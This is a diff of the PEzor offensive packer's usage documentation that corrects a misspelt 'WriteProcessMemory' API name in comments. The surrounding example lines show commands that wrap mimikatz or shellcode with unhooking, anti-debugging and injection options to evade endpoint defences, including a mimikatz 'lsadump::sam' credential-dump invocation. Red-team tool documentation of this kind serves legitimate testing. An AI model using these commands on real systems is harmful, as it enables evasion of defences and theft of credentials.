@@ -124,9 +124,9 @@ EXAMPLES
   $ PEzor.sh -format=dotnet-createsection -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
-  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
+  # 32-bit (Win32 API: VirtualAlloc/WriteProcessMemory/CreateRemoteThread)
   $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
-  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread) and arguments for donut
+  # 32-bit (Win32 API: VirtualAlloc/WriteProcessMemory/CreateRemoteThread) and arguments for donut
   $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2 "-plsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv"
 ```
 <!-- pezor-executablestop -->
@@ -189,7 +189,7 @@ EXAMPLES
   $ PEzor.sh -format=dotnet-createsection shellcode.bin
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
-  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
+  # 32-bit (Win32 API: VirtualAlloc/WriteProcessMemory/CreateRemoteThread)
   $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 shellcode.bin
 ```
 
